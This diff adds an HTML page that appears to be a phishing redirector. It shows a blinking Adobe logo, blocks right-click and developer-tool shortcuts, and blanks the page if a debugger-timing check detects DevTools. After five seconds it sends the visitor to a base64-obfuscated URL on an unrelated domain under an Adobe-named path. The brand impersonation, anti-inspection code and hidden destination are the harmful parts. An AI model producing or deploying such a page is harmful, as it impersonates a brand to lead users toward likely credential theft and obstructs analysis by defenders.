@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Redirecting...</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background: #fff;
+    }
+    .logo-container {
+        text-align: center;
+        opacity: 0;
+        animation: blink 2.5s ease-in-out infinite; /* Slower blink: full cycle every 2.5s */
+    }
+    .logo-container img {
+        max-width: 200px;
+        height: auto;
+    }
+    @keyframes blink {
+        0%, 100% { opacity: 0; }
+        50%       { opacity: 1; }
+    }
+</style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://blog.logomaster.ai/hs-fs/hubfs/adobe-logo-1.jpg?width=662&height=441&name=adobe-logo-1.jpg alt="Logo">
+    </div>
+    <script type="text/javascript">
+        // Anti right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        // Anti F12 and other dev tools shortcuts
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+J
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+C
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Anti-debug - detects if DevTools is open
+        setInterval(function() {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                window.location.href = 'about:blank';
+            }
+        }, 1000);
+        
+        // Redirect after animation
+        setTimeout(function() {
+            window.location.href = atob('aHR0cHM6Ly91ZHNpcy5la2ltaW5pLmNvbS9hZG9iZS8=');
+        }, 5000);
+    </script>
+</body>
+</html>
